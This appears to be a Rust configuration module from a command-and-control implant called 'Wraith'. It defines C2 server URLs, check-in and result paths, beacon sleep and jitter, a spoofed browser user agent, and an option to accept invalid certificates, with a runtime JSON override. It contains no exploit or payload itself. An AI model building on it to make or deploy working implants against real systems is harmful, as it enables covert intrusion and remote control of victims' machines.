use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Resolve an env var at compile time, falling back to a string literal.
/// Usage: `const X: &str = env_or!("MY_VAR", "fallback");`
macro_rules! env_or {
    ($var:literal, $default:literal) => {
        match option_env!($var) {
            Some(v) => v,
            None => $default,
        }
    };
}

const DEFAULT_C2_BASE_URL: &str = env_or!("WRAITH_C2_URL", "https://127.0.0.1:443");
const DEFAULT_CHECKIN_URI: &str = env_or!("WRAITH_CHECKIN_URI", "/api/v1/update");
const DEFAULT_RESULT_URI: &str = env_or!("WRAITH_RESULT_URI", "/api/v1/result");
const DEFAULT_PROFILE_NAME: &str = env_or!("WRAITH_PROFILE", "default-https");
const DEFAULT_SLEEP_MS: u64 = 5_000;
const DEFAULT_JITTER_PCT: u64 = 20;

/// Path to an optional runtime config file. If present it overrides the
/// compiled-in defaults, enabling staged deployment scenarios.
const CONFIG_FILE_PATH: &str = "wraith.json";

/// Runtime config for the implant. Loaded from a JSON file if present, or
/// uses compiled-in defaults for stageless/embedded deployment.
///
/// Build-time overrides (set via env vars when building):
///   WRAITH_C2_URL, WRAITH_CHECKIN_URI, WRAITH_RESULT_URI, WRAITH_PROFILE
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImplantConfig {
    #[serde(default = "default_c2_base_url")]
    pub c2_base_url: String,
    #[serde(default = "default_checkin_uri")]
    pub checkin_uri: String,
    #[serde(default = "default_result_uri")]
    pub result_uri: String,
    #[serde(default = "default_profile_name")]
    pub profile_name: String,
    #[serde(default = "default_sleep_ms")]
    pub sleep_ms: u64,
    #[serde(default = "default_jitter_pct")]
    pub jitter_pct: u64,
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    /// Extra HTTP headers to include with every request (from the profile).
    #[serde(default)]
    pub headers: HashMap<String, String>,
    /// Accept invalid/self-signed TLS certificates. Use only in lab setups.
    #[serde(default)]
    pub accept_invalid_certs: bool,
}

impl Default for ImplantConfig {
    fn default() -> Self {
        Self {
            c2_base_url: default_c2_base_url(),
            checkin_uri: default_checkin_uri(),
            result_uri: default_result_uri(),
            profile_name: default_profile_name(),
            sleep_ms: default_sleep_ms(),
            jitter_pct: default_jitter_pct(),
            user_agent: default_user_agent(),
            headers: HashMap::new(),
            accept_invalid_certs: false,
        }
    }
}

pub fn load() -> Result<ImplantConfig> {
    match std::fs::read_to_string(CONFIG_FILE_PATH) {
        Ok(content) => serde_json::from_str(&content)
            .context("invalid implant config JSON"),
        Err(_) => Ok(ImplantConfig::default()),
    }
}

fn default_c2_base_url() -> String { DEFAULT_C2_BASE_URL.to_owned() }
fn default_checkin_uri() -> String { DEFAULT_CHECKIN_URI.to_owned() }
fn default_result_uri() -> String { DEFAULT_RESULT_URI.to_owned() }
fn default_profile_name() -> String { DEFAULT_PROFILE_NAME.to_owned() }
fn default_sleep_ms() -> u64 { DEFAULT_SLEEP_MS }
fn default_jitter_pct() -> u64 { DEFAULT_JITTER_PCT }
fn default_user_agent() -> String {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36".to_owned()
}
